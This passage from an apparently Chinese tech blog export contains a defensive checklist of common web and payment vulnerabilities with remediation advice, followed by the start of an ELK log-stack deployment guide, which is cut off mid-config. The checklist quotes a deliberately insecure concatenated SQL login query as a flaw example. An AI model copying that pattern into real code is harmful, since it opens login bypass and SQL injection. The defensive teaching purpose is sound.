href="#2-用户登陆" class="headerlink" title="2.用户登陆"></a>2.用户登陆</h3><h4 id="a-明文传输-1"><a href="#a-明文传输-1" class="headerlink" title="a.明文传输"></a>a.明文传输</h4><p>　　在传输用户登陆信息时未对信息进行加密处理，攻击者能够使用中间人攻击截获未加密的用户注册信息。</p><p>建议：对用户登陆信息加密后传输。</p><h4 id="b-暴力破解-1"><a href="#b-暴力破解-1" class="headerlink" title="b.暴力破解"></a>b.暴力破解</h4><p>　　在输入手机验证码等动态验证码时未进行人机校验，攻击者可利用工具对验证码进行暴力破解。</p><p>建议：增加图形验证码。</p><h4 id="c-万能密码"><a href="#c-万能密码" class="headerlink" title="c.万能密码"></a>c.万能密码</h4><p>　　由于判断用户凭证时判断语句存在逻辑缺陷（如：<code>sql=\&quot;select \* from admin where username=\&quot;&amp;user&amp;\&quot; and password=\&quot;&amp;pwd&amp;\&quot;\&quot;</code>），攻击者可以构造语句使密码验证失效，实现万能密码。</p><p>建议：过滤用户输入；查询和判断分步执行。</p><h4 id="d-Sql注入"><a href="#d-Sql注入" class="headerlink" title="d.Sql注入"></a>d.Sql注入</h4><p>　　由于查询用户是否存在时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。</p><p>建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。</p><h4 id="e-前端验证"><a href="#e-前端验证" class="headerlink" title="e.前端验证"></a>e.前端验证</h4><p>　　在后端验证完相关信息后会像前端返回状态码，前端根据状态码控制跳转，攻击者通过修改返回的状态码实现绕过验证。</p><p>建议：通过后端控制页面跳转</p><h4 id="f-登陆提示信息"><a href="#f-登陆提示信息" class="headerlink" title="f.登陆提示信息"></a>f.登陆提示信息</h4><p>　　在用户输入凭证时会根据账号密码的正确性做出相应的提示，攻击者能够据此来判断猜测的用户凭证是否正确。</p><p>建议：对于登陆提示统一为用户名或密码错误。</p><h3 id="3-密码找回"><a href="#3-密码找回" class="headerlink" title="3.密码找回"></a>3.密码找回</h3><h4 id="a-明文传输-2"><a href="#a-明文传输-2" class="headerlink" title="a.明文传输"></a>a.明文传输</h4><p>　　在传输用户信息时未对信息进行加密处理，攻击者能够使用中间人攻击截获未加密的用户注册信息。</p><p>建议：对用户信息加密后传输。</p><h4 id="b-暴力破解-2"><a href="#b-暴力破解-2" class="headerlink" title="b.暴力破解"></a>b.暴力破解</h4><p>　　在输入手机验证码等动态验证码时未进行人机校验，攻击者可利用工具对验证码进行暴力破解。</p><p>建议：增加图形验证码。</p><h4 id="c-前端验证"><a href="#c-前端验证" class="headerlink" title="c.前端验证"></a>c.前端验证</h4><p>　　在后端验证完相关信息后会像前端返回状态码，前端根据状态码控制跳转，攻击者通过修改返回的状态码实现绕过验证。</p><p>建议：通过后端控制页面跳转</p><h4 id="d-验证码回传"><a href="#d-验证码回传" class="headerlink" title="d.验证码回传"></a>d.验证码回传</h4><p>　　用户获取动态验证码时后端会将验证码通过response数据包返回到前端，攻击者能够通过抓包获取验证码从而实现任意手机号注册。</p><p>建议：过滤response包中验证码字段。</p><h4 id="e-验证码失效机制-1"><a href="#e-验证码失效机制-1" class="headerlink" title="e.验证码失效机制"></a>e.验证码失效机制</h4><p>验证码失效分两种情况：</p><p>　　1.验证码可以重复使用，攻击者可以通过手动输入一次验证码进行爆破。</p><p>建议：验证码使用后自动刷新。</p><p>　　2.用户A获取的验证码可以用于用户B修改密码，攻击者可以实现任意用户修改密码。</p><p>建议：验证码关联用户。</p><h4 id="f-业务流绕过"><a href="#f-业务流绕过" class="headerlink" title="f.业务流绕过"></a>f.业务流绕过</h4><p>　　在某些情况下密码找回流程分为几个页面，攻击者可以通过直接访问后续流程页面实现绕过验证注册。</p><p>建议：严格控制业务流顺序。</p><h4 id="g-账号遍历"><a href="#g-账号遍历" class="headerlink" title="g.账号遍历"></a>g.账号遍历</h4><p>　　在找回密码时提示用户不存在，攻击者可以通过批量发送数据包来获取已注册的用户账号。</p><p>建议：限制单ip一定时间内提交数据次数；用户存在与否统一不作提示。</p><h4 id="h-短信、邮件炸弹"><a href="#h-短信、邮件炸弹" class="headerlink" title="h.短信、邮件炸弹"></a>h.短信、邮件炸弹</h4><p>　　调用短信、邮件接口时未进行限制，攻击者可以通过批量发送请求数据包实现短信、邮件轰炸或使短信邮件接口堵塞，影响业务正常运行。</p><p>建议：在调用短信、邮件接口时校验验证码；限制单ip一定时间内请求次数。</p><h3 id="4-用户信息"><a href="#4-用户信息" class="headerlink" title="4.用户信息"></a>4.用户信息</h3><h4 id="a-越权"><a href="#a-越权" class="headerlink" title="a.越权"></a>a.越权</h4><p>　　在调用操作接口（查询、修改、删除等）时未校验用户身份，攻击者能够根据id等关键字实现越权操作接口。</p><p>建议：调用接口时校验用户身份。</p><h4 id="b-Sql注入"><a href="#b-Sql注入" class="headerlink" title="b.Sql注入"></a>b.Sql注入</h4><p>　　由于查询用户信息时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。</p><p>建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。</p><h4 id="c-XSS"><a href="#c-XSS" class="headerlink" title="c.XSS"></a>c.XSS</h4><p>　　由于在保存用户信息时未对用户输入进行过滤或者过滤不完全，攻击者可以通过构造语句实现XSS。</p><p>建议：过滤用户输入；转义后输出。</p><h4 id="d-文件上传"><a href="#d-文件上传" class="headerlink" title="d.文件上传"></a>d.文件上传</h4><p>　　在文件上传点未对上传文件做限制或仅在前端对文件做限制，攻击者能够上传脚本等文件获得操作权限。</p><p>建议：后端验证文件类型；重写文件；不返回保存路径；保存文件在没有执行权限的目录下。</p><h3 id="5-订单信息"><a href="#5-订单信息" class="headerlink" title="5.订单信息"></a>5.订单信息</h3><h4 id="a-订单信息遍历"><a href="#a-订单信息遍历" class="headerlink" title="a.订单信息遍历"></a>a.订单信息遍历</h4><p>　　在调用订单信息查询接口时未校验用户身份，攻击者能够根据id等关键字实现越权操作接口。</p><p>建议：调用接口时校验用户身份。</p><h4 id="b-Sql注入-1"><a href="#b-Sql注入-1" class="headerlink" title="b.Sql注入"></a>b.Sql注入</h4><p>　　由于查询订单信息时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。</p><p>建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。</p><h3 id="6-用户充值"><a href="#6-用户充值" class="headerlink" title="6.用户充值"></a>6.用户充值</h3><h4 id="a-充值金额修改"><a href="#a-充值金额修改" class="headerlink" title="a.充值金额修改"></a>a.充值金额修改</h4><p>　　在用户充值时，仅根据三方接口返回的充值状态判断充值是否成功，攻击者通过修改支付金额实现小金额充值。</p><p>建议：充值时校验三方接口返回的充值状态以及充值金额等信息。</p><h3 id="7-用户交易"><a href="#7-用户交易" class="headerlink" title="7.用户交易"></a>7.用户交易</h3><h4 id="a-支付金额修改"><a href="#a-支付金额修改" class="headerlink" title="a.支付金额修改"></a>a.支付金额修改</h4><p>　　1.用户支付时仅根据支付状态来判断订单是否支付成功，攻击者通过修改支付金额实现小金额支付。</p><p>建议：交易时校验支付接口返回的充值状态以及充值金额等信息。</p><p>　　2.用户支付时系统根据用户客户端当前时间确定汇率，攻击者通过修改本机时间达到低价支付。</p><p>建议：支付时根据最新汇率确定支付金额。</p><h4 id="b-竞争机制"><a href="#b-竞争机制" class="headerlink" title="b.竞争机制"></a>b.竞争机制</h4><p>　　在极短时间内提交两笔支付请求，两笔交易会同时访问共享内存，由于竞争条件的存在请求会按照线程运行的时序运行，这时就可能存在竞争条件漏洞如下图。</p><img src="/Security/交易系统常见问题及方案概述/竞争机制.png"><p>建议：使用乐观锁或者悲观锁来保证事务的ACID特性，避免一个事务读取另一个事务未提交的数据。</p><h3 id="8-用户提现"><a href="#8-用户提现" class="headerlink" title="8.用户提现"></a>8.用户提现</h3><h4 id="a-竞争机制"><a href="#a-竞争机制" class="headerlink" title="a.竞争机制"></a>a.竞争机制</h4><p>　　在极短时间内提交两笔提现请求，两笔交易会同时访问共享内存，由于竞争条件的存在请求会按照线程运行的时序运行，这时就可能存在竞争条件漏洞如下图。</p><img src="/Security/交易系统常见问题及方案概述/竞争机制.png"><p>建议：使用乐观锁或者悲观锁来保证事务的ACID特性，避免一个事务读取另一个事务未提交的数据。</p><h3 id="9-管理后台"><a href="#9-管理后台" class="headerlink" title="9.管理后台"></a>9.管理后台</h3><h4 id="a-管理页面暴露"><a href="#a-管理页面暴露" class="headerlink" title="a.管理页面暴露"></a>a.管理页面暴露</h4><p>　　由于管理后台路径过于常规化，攻击者能够通过字典爆破后台。</p><p>建议：设置复杂管理后台路径（例如：<a href="http://192.168.3.249:81/live-not-to-eat-but-eat-to-live/sign-in）。" target="_blank" rel="noopener">http://192.168.3.249:81/live-not-to-eat-but-eat-to-live/sign-in）。</a></p><h4 id="b-弱口令"><a href="#b-弱口令" class="headerlink" title="b.弱口令"></a>b.弱口令</h4><p>　　管理员用户设置了过于简单的密码，攻击者通过字典爆破获得密码。</p><p>建议：设置安全口令</p><h4 id="c-Sql注入"><a href="#c-Sql注入" class="headerlink" title="c.Sql注入"></a>c.Sql注入</h4><p>　　由于查询用户是否存在时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。</p><p>建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。</p><h4 id="d-万能密码"><a href="#d-万能密码" class="headerlink" title="d.万能密码"></a>d.万能密码</h4><p>　　由于判断用户凭证时判断语句存在逻辑缺陷（如：<code>sql=\&quot;select \* from admin where username=\&quot;&amp;user&amp;\&quot; and password=\&quot;&amp;pwd&amp;\&quot;\&quot;</code>），攻击者可以构造语句使密码验证失效，实现万能密码。</p><p>建议：过滤用户输入；查询和判断分步执行。</p><h4 id="e-越权"><a href="#e-越权" class="headerlink" title="e.越权"></a>e.越权</h4><p>　　管理页面仅通过登陆页面做身份认证，后续页面没有校验用户身份，攻击者通过直接访问功能路径获得管理员权限。</p><p>建议：页面跳转时校验用户身份。</p><h3 id="10-用户凭证"><a href="#10-用户凭证" class="headerlink" title="10.用户凭证"></a>10.用户凭证</h3><h4 id="a-会话失效机制"><a href="#a-会话失效机制" class="headerlink" title="a.会话失效机制"></a>a.会话失效机制</h4><p>　　用户会话注销后未失效，攻击者通过XSS等手段获取用户权限。</p><p>建议：用户注销后会话强制失效</p><h3 id="11-主机安全"><a href="#11-主机安全" class="headerlink" title="11.主机安全"></a>11.主机安全</h3><h4 id="a-服务器信息泄露"><a href="#a-服务器信息泄露" class="headerlink" title="a.服务器信息泄露"></a>a.服务器信息泄露</h4><p>　　服务器处理请求时产生错误信息，这些信息未经过滤直接现实在页面上，攻击者据此了解服务器的相关信息。</p><p>建议：服务器端产生的信息过滤后展示到前端。</p><h4 id="b-目录遍历"><a href="#b-目录遍历" class="headerlink" title="b.目录遍历"></a>b.目录遍历</h4><p>　　服务器访问控制未配置或配置不完全，攻击者能够通过访问根目录，发送一系列”../“字符来遍历高层目录。</p><p>建议：对文件目录做访问控制。</p><h4 id="c-弱口令"><a href="#c-弱口令" class="headerlink" title="c.弱口令"></a>c.弱口令</h4><p>　　管理员用户设置了过于简单的密码，攻击者通过字典爆破获得密码。</p><p>建议：设置安全口令。</p><h4 id="d-远程代码执行"><a href="#d-远程代码执行" class="headerlink" title="d.远程代码执行"></a>d.远程代码执行</h4><p>　　某些应用框架没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。</p><p>建议：升级框架版本。</p><h4 id="e-java反序列化"><a href="#e-java反序列化" class="headerlink" title="e.java反序列化"></a>e.java反序列化</h4><p>　　Java应用对用户输入，即不可信数据做了反序列化处理，攻击者可以通过构造恶意输入实现任意代码执行。</p><p>建议：升级java应用版本。</p><h4 id="f-明文存储用户数据"><a href="#f-明文存储用户数据" class="headerlink" title="f.明文存储用户数据"></a>f.明文存储用户数据</h4><p>　　用户数据以明文形式保存在数据库中，当数据库数据泄露时，攻击者能够直接利用这些数据。</p><p>建议：用户信息以加密后的密文形式保存。</p><h4 id="g-撞库"><a href="#g-撞库" class="headerlink" title="g.撞库"></a>g.撞库</h4><p>　　由于大多数用户都使用同一套账号密码，当一个网站的用户信息泄露后，攻击者能利用这些数据对其他网站进行登陆，从而获得一份真实有效的用户凭证。</p><p>建议：限制ip的登陆频率；新ip登陆时需要验证身份；</p><h2 id="三、方案简述"><a href="#三、方案简述" class="headerlink" title="三、方案简述"></a>三、方案简述</h2><h3 id="1-安全评估"><a href="#1-安全评估" class="headerlink" title="1.安全评估"></a>1.安全评估</h3><h4 id="a-系统上线前安全评估"><a href="#a-系统上线前安全评估" class="headerlink" title="a.系统上线前安全评估"></a>a.系统上线前安全评估</h4><h4 id="b-服务器安全基线检查"><a href="#b-服务器安全基线检查" class="headerlink" title="b.服务器安全基线检查"></a>b.服务器安全基线检查</h4><h3 id="2-安全审计"><a href="#2-安全审计" class="headerlink" title="2.安全审计"></a>2.安全审计</h3><h4 id="a-Web应用代码审计"><a href="#a-Web应用代码审计" class="headerlink" title="a.Web应用代码审计"></a>a.Web应用代码审计</h4><h4 id="b-移动应用代码审计"><a href="#b-移动应用代码审计" class="headerlink" title="b.移动应用代码审计"></a>b.移动应用代码审计</h4><h3 id="3-安全运营"><a href="#3-安全运营" class="headerlink" title="3.安全运营"></a>3.安全运营</h3><h3 id="a-日志审计"><a href="#a-日志审计" class="headerlink" title="a.日志审计"></a>a.日志审计</h3><h4 id="b-警告处置"><a href="#b-警告处置" class="headerlink" title="b.警告处置"></a>b.警告处置</h4><h4 id="c-安全培训"><a href="#c-安全培训" class="headerlink" title="c.安全培训"></a>c.安全培训</h4><h3 id="4-应急响应"><a href="#4-应急响应" class="headerlink" title="4.应急响应"></a>4.应急响应</h3><h4 id="a-突发事件处置"><a href="#a-突发事件处置" class="headerlink" title="a.突发事件处置"></a>a.突发事件处置</h4><h4 id="b-复盘溯源"><a href="#b-复盘溯源" class="headerlink" title="b.复盘溯源"></a>b.复盘溯源</h4><h3 id="5-监控扫描"><a href="#5-监控扫描" class="headerlink" title="5.监控扫描"></a>5.监控扫描</h3><h4 id="a-漏洞扫描"><a href="#a-漏洞扫描" class="headerlink" title="a.漏洞扫描"></a>a.漏洞扫描</h4><h4 id="b-文件监控"><a href="#b-文件监控" class="headerlink" title="b.文件监控"></a>b.文件监控</h4><h3 id="6-边界防御"><a href="#6-边界防御" class="headerlink" title="6.边界防御"></a>6.边界防御</h3><h4 id="a-网络管控"><a href="#a-网络管控" class="headerlink" title="a.网络管控"></a>a.网络管控</h4><h4 id="b-抗D"><a href="#b-抗D" class="headerlink" title="b.抗D"></a>b.抗D</h4>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全文档 </tag>
            
            <tag> 安全方案 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>开源产品自建企业安全-脑图</title>
      <link href="/Security/%E5%BC%80%E6%BA%90%E4%BA%A7%E5%93%81%E8%87%AA%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8-%E8%84%91%E5%9B%BE/"/>
      <url>/Security/%E5%BC%80%E6%BA%90%E4%BA%A7%E5%93%81%E8%87%AA%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8-%E8%84%91%E5%9B%BE/</url>
      <content type="html"><![CDATA[<a id="more"></a><img src="/Security/开源产品自建企业安全-脑图/开源方案.jpg">]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 企业安全 </tag>
            
            <tag> 脑图 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ELK6.2.4部署</title>
      <link href="/deployment/ELK6-2-4%E9%83%A8%E7%BD%B2/"/>
      <url>/deployment/ELK6-2-4%E9%83%A8%E7%BD%B2/</url>
      <content type="html"><![CDATA[<h2 id="一、ELK介绍"><a href="#一、ELK介绍" class="headerlink" title="一、ELK介绍"></a>一、ELK介绍</h2><h3 id="1-什么是ELK"><a href="#1-什么是ELK" class="headerlink" title="1.什么是ELK"></a>1.什么是ELK</h3><p>ELK是指elastic公司三款开源产品的简称（此外，还可能经常用到Filebeat和X-Pack），他们分别是：</p><table><thead><tr><th style="text-align:center">简称</th><th style="text-align:center">全称</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">E:</td><td style="text-align:center">Elasticsearch</td><td style="text-align:center">开源全文搜索和分析引擎</td></tr><tr><td style="text-align:center">L:</td><td style="text-align:center">Logstash</td><td style="text-align:center">开源数据收集引擎</td></tr><tr><td style="text-align:center">K:</td><td style="text-align:center">Kibana</td><td style="text-align:center">开源数据分析和可视化平台</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">Filebeat</td><td style="text-align:center">轻量级数据转发引擎</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">X-Pack</td><td style="text-align:center">Elastic Stack扩展包</td></tr></tbody></table><h3 id="2-为什么需要ELK"><a href="#2-为什么需要ELK" class="headerlink" title="2.为什么需要ELK"></a>2.为什么需要ELK</h3><p>随着公司业务的不断扩展，各个系统日志产生量越来越大，这时候就需要日志统一管理的解决方案，便于之后的日志审计等工作。而ELK具有强大的日志收集、查询和分析等功能，同时还提供了友好的展示界面，便于用户操作，这贴合日志统一管理的需求。</p><h3 id="3-ELK工作原理"><a href="#3-ELK工作原理" class="headerlink" title="3.ELK工作原理"></a>3.ELK工作原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">服务器1--&gt;|Filebeat|Logstash1;</span><br><span class="line">服务器2--&gt;|Filebeat|Logstash1;</span><br><span class="line">服务器3--&gt;|Filebeat|Logstash1;</span><br><span class="line">Logstash1--&gt;Kafka集群;</span><br><span class="line">Kafka集群--&gt;Logstash2;</span><br><span class="line">Logstash2--&gt;Elasticsearch集群;</span><br><span class="line">Elasticsearch集群--&gt;Kibana;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="二、环境配置"><a href="#二、环境配置" class="headerlink" title="二、环境配置"></a>二、环境配置</h2><h3 id="1-服务器清单"><a href="#1-服务器清单" class="headerlink" title="1.服务器清单"></a>1.服务器清单</h3><table><thead><tr><th style="text-align:center">ip</th><th style="text-align:center">描述</th><th style="text-align:center">安装软件</th></tr></thead><tbody><tr><td style="text-align:center">192.168.1.11</td><td style="text-align:center">web服务器</td><td style="text-align:center">Filebeat</td></tr><tr><td style="text-align:center">192.168.1.12</td><td style="text-align:center">web服务器</td><td style="text-align:center">Filebeat</td></tr><tr><td style="text-align:center">192.168.1.13</td><td style="text-align:center">数据库服务器</td><td style="text-align:center">Filebeat</td></tr><tr><td style="text-align:center">192.168.1.21</td><td style="text-align:center">Kafka集群</td><td style="text-align:center">Kafka + logstash</td></tr><tr><td style="text-align:center">192.168.1.22</td><td style="text-align:center">Kafka集群</td><td style="text-align:center">Kafka + logstash</td></tr><tr><td style="text-align:center">192.168.1.23</td><td style="text-align:center">Kafka集群</td><td style="text-align:center">Kafka + logstash</td></tr><tr><td style="text-align:center">192.168.1.31</td><td style="text-align:center">logstash</td><td style="text-align:center">X-Pack + logstash</td></tr><tr><td style="text-align:center">192.168.1.41</td><td style="text-align:center">Elasticsearch集群</td><td style="text-align:center">Elasticsearch + X-Pack + Kibana</td></tr><tr><td style="text-align:center">192.168.1.42</td><td style="text-align:center">Elasticsearch集群</td><td style="text-align:center">Elasticsearch + X-Pack + Kibana</td></tr><tr><td style="text-align:center">192.168.1.43</td><td style="text-align:center">Elasticsearch集群</td><td style="text-align:center">Elasticsearch + X-Pack + Kibana</td></tr></tbody></table><h3 id="2-安装JDK"><a href="#2-安装JDK" class="headerlink" title="2.安装JDK"></a>2.安装JDK</h3><p>ELK6.X.X要求JDK版本大于1.8 ，<a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html" target="_blank" rel="noopener">官网</a>下载后上传至服务器安装<br><code>yum localinstall -y jdk-XXX</code><br>安装完成后测试安装是否成功<br><code>java -version</code></p><h3 id="3-关闭防火墙"><a href="#3-关闭防火墙" class="headerlink" title="3.关闭防火墙"></a>3.关闭防火墙</h3><p><code>systemctl stop firewalld.service #停止firewall</code></p><p><code>systemctl disable firewalld.service #禁止firewall开机启动</code></p><p>生产环境中请根据实际需求配置防火墙。</p><h3 id="4-安装screen"><a href="#4-安装screen" class="headerlink" title="4.安装screen"></a>4.安装screen</h3><p><code>yum install -y screen</code></p><h3 id="5-下载Elasticserch、Logstash、Kibana、Kafka"><a href="#5-下载Elasticserch、Logstash、Kibana、Kafka" class="headerlink" title="5.下载Elasticserch、Logstash、Kibana、Kafka"></a>5.下载Elasticserch、Logstash、Kibana、Kafka</h3><p><a href="https://www.elastic.co/downloads" target="_blank" rel="noopener">官网</a>下载后上传至服务器</p><h2 id="三、Filebeat配置"><a href="#三、Filebeat配置" class="headerlink" title="三、Filebeat配置"></a>三、Filebeat配置</h2><h3 id="1-安装Filebeat"><a href="#1-安装Filebeat" class="headerlink" title="1.安装Filebeat"></a>1.安装Filebeat</h3><p><code>curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.3.0-x86_64.rpm</code><br><code>rpm -ivh filebeat-6.3.0-x86_64.rpm</code></p><h3 id="2-监控nginx日志"><a href="#2-监控nginx日志" class="headerlink" title="2.监控nginx日志"></a>2.监控nginx日志</h3><p>将nginx日志格式修改为json<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">log_format</span> access_json <span class="string">'&#123;"<span class="variable">@timestamp</span>":"<span class="variable">$time_iso8601</span>",'</span></span><br><span class="line">                           <span class="string">'"host":"<span class="variable">$server_addr</span>",'</span></span><br><span class="line">                           <span class="string">'"clientip":"<span class="variable">$remote_addr</span>",'</span></span><br><span class="line">                           <span class="string">'"size":<span class="variable">$body_bytes_sent</span>,'</span></span><br><span class="line">                           <span class="string">'"responsetime":<span class="variable">$request_time</span>,'</span></span><br><span class="line">                           <span class="string">'"upstreamtime":"<span class="variable">$upstream_response_time</span>",'</span></span><br><span class="line">                           <span class="string">'"upstreamhost":"<span class="variable">$upstream_addr</span>",'</span></span><br><span class="line">                           <span class="string">'"http_host":"<span class="variable">$host</span>",'</span></span><br><span class="line">                           <span class="string">'"url":"<span class="variable">$uri</span>",'</span></span><br><span class="line">                           <span class="string">'"domain":"<span class="variable">$host</span>",'</span></span><br><span class="line">                           <span class="string">'"xff":"<span class="variable">$http_x_forwarded_for</span>",'</span></span><br><span class="line">                           <span class="string">'"referer":"<span class="variable">$http_referer</span>",'</span></span><br><span class="line">                           <span class="string">'"status":"<span class="variable">$status</span>"&#125;'</span>;</span><br><span class="line">    <span class="attribute">access_log</span>  /var/log/nginx/access.log  access_json;</span><br></pre></td></tr></table></figure></p><p>修改Filebeat配置文件<br><code>vi /etc/filebeat/filebeat.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">filebeat.prospectors:</span><br><span class="line">- input_type: log</span><br><span class="line">  paths:</span><br><span class="line">    - /home/wwwlogs/access.log</span><br><span class="line">  document_type: &quot;nginx_access&quot;</span><br><span class="line">  fields:</span><br><span class="line">    logsource: nginx</span><br><span class="line">    logtype: nginx_access</span><br><span class="line">output.logstash:</span><br><span class="line">  hosts: [&quot;192.168.1.21:5044&quot;]  #不同日志根据实际情况传送至不同Kafka服务器</span><br></pre></td></tr></table></figure></p><h3 id="3-监控mysql慢查询日志"><a href="#3-监控mysql慢查询日志" class="headerlink" title="3.监控mysql慢查询日志"></a>3.监控mysql慢查询日志</h3><p>修改filebeat日志<br><code>vi /etc/filebeat/filebeat.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">- input_type: log</span><br><span class="line">  paths:</span><br><span class="line">    - /usr/local/mysql/var/mysql/slow_log.CSV</span><br><span class="line">  document_type: &quot;mysql_slow&quot;</span><br><span class="line">  fields:</span><br><span class="line">    logsource: mysql</span><br><span class="line">    logtype: mysql_slow</span><br><span class="line"></span><br><span class="line">if [fields][logtype] == &quot;mysql_slow&quot; &#123;</span><br><span class="line">    csv &#123;</span><br><span class="line">      columns =&gt; [ &quot;timestamp&quot;, &quot;user_host&quot;, &quot;query_time&quot;, &quot;lock_time&quot;,</span><br><span class="line">                   &quot;rows_sent&quot;, &quot;rows_examined&quot;, &quot;db&quot;, &quot;last_insert_id&quot;,</span><br><span class="line">                   &quot;insert_id&quot;, &quot;server_id&quot;, &quot;sql_text&quot;, &quot;thread_id&quot;, &quot;rows_affected&quot; ]</span><br><span class="line">    &#125;</span><br><span class="line">    mutate &#123;</span><br><span class="line">      convert =&gt; &#123; &quot;rows_sent&quot; =&gt; &quot;integer&quot; &#125;</span><br><span class="line">      convert =&gt; &#123; &quot;rows_examined&quot; =&gt; &quot;integer&quot; &#125;</span><br><span class="line">      convert =&gt; &#123; &quot;last_insert_id&quot; =&gt; &quot;integer&quot; &#125;</span><br><span class="line">      convert =&gt; &#123; &quot;insert_id&quot; =&gt; &quot;integer&quot; &#125;</span><br><span class="line">      convert =&gt; &#123; &quot;server_id&quot; =&gt; &quot;integer&quot; &#125;</span><br><span class="line">      convert =&gt; &#123; &quot;thread_id&quot; =&gt; &quot;integer&quot; &#125;</span><br><span class="line">      convert =&gt; &#123; &quot;rows_affected&quot; =&gt; &quot;integer&quot; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    date &#123;</span><br><span class="line">      match =&gt; [ &quot;timestamp&quot;, &quot;yyyy-MM-dd HH:mm:ss.SSSSSS&quot; ]</span><br><span class="line">      remove_field =&gt; [ &quot;timestamp&quot; ]</span><br><span class="line">    &#125;</span><br><span class="line">    mutate &#123;</span><br><span class="line"> gsub =&gt; [</span><br><span class="line">        &quot;query_time&quot;, &quot;(.*\.)(\d)(\d)\d+&quot;, &quot;\1\2\3&quot;,</span><br><span class="line">        &quot;lock_time&quot;, &quot;(.*\.)(\d)(\d)\d+&quot;, &quot;\1\2\3&quot;</span><br><span class="line">        ]</span><br><span class="line">        &#125;</span><br><span class="line">     ruby &#123; code =&gt; &quot;event.set(&apos;query_time&apos; , event.get(&apos;query_time&apos;) ? event.get(&apos;query_time&apos;).split(&apos;:&apos;).inject(0)&#123;|a, m| a = a * 60 + m.to_f&#125; : 0)&quot;&#125;</span><br><span class="line">     ruby &#123; code =&gt; &quot;event.set(&apos;lock_time&apos; , event.get(&apos;lock_time&apos;) ? event.get(&apos;lock_time&apos;).split(&apos;:&apos;).inject(0)&#123;|a, m| a = a * 60 + m.to_f&#125; : 0)&quot; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  output.logstash:</span><br><span class="line">  hosts: [&quot;192.168.1.23:5044&quot;]  #不同日志根据实际情况传送至不同Kafka服务器</span><br></pre></td></tr></table></figure></p><h2 id="二、Kafka集群上的Logstash配置"><a href="#二、Kafka集群上的Logstash配置" class="headerlink" title="二、Kafka集群上的Logstash配置"></a>二、Kafka集群上的Logstash配置</h2><h3 id="1-接收nginx日志"><a href="#1-接收nginx日志" class="headerlink" title="1.接收nginx日志"></a>1.接收nginx日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    beats &#123;</span><br><span class="line">    port =&gt; 5044</span><br><span class="line">        codec =&gt; plain&#123; charset =&gt; &quot;GBK&quot; &#125; #设置编码</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter &#123;</span><br><span class="line">  if [fields][logtype] == 